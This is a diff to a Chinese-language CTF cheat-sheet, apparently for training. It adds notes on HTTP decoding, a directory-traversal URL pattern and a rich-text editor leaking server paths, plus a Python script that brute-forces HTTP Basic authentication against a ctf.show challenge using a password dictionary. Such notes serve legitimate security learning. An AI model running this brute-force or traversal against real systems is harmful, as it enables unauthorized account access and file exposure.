@@ -6,7 +6,7 @@ CTF Run
 
 ### HTTP
 
-- HTTP 会将 URL 和 Headers 自动解 urldecode，但是不会解 POST 方法内的 urldecode
+- HTTP 会将 URL 和 Headers 自动解 urldecode，但是不会解 POST 方法内的 urldecode (其实不一定，urldecode 是由编程语言负责的，具体看怎么设定的)
 
 #### httpie
 
@@ -136,6 +136,47 @@ git clone https://github.com/denny0223/scrabble.git
 
 ##### 目录穿越
 穿越到上级目录 http://xxx/img../
+
+ #### 富文本编辑器
+
+##### 暴露服务端文件
+
+在富文本编辑器中点击上传云文件或云图片时，暴露出了服务端目录。
+
+### 密码爆破
+
+#### 弹窗式密码
+
+这种密码往往通过 HTTP 的 Authorization 请求头发送，示例如下
+
+```
+Authorization: Basic YWRtaW46MDAwMA==
+```
+
+其中，将 `YWRtaW46MDAwMA==` 解 base64 可以得到 `admin:0000`，示例爆破代码如下
+
+```python
+import base64
+
+import httpx
+
+
+def main():
+    with open('最新网站后台密码破解字典.txt', 'r') as f:
+        passwords = f.read().splitlines()
+    
+    for password in passwords:
+        headers = {
+            'Authorization': 'Basic ' + base64.b64encode(('admin:' + password).encode()).decode()
+        }
+        print(headers)
+        r = httpx.get('http://ed2d415d-caef-4a1a-b425-bc0ec7323fa3.challenge.ctf.show/', headers=headers)
+        print(r.text)
+
+
+if __name__ == '__main__':
+    main()
+```
 
 ### SQL 攻击
 
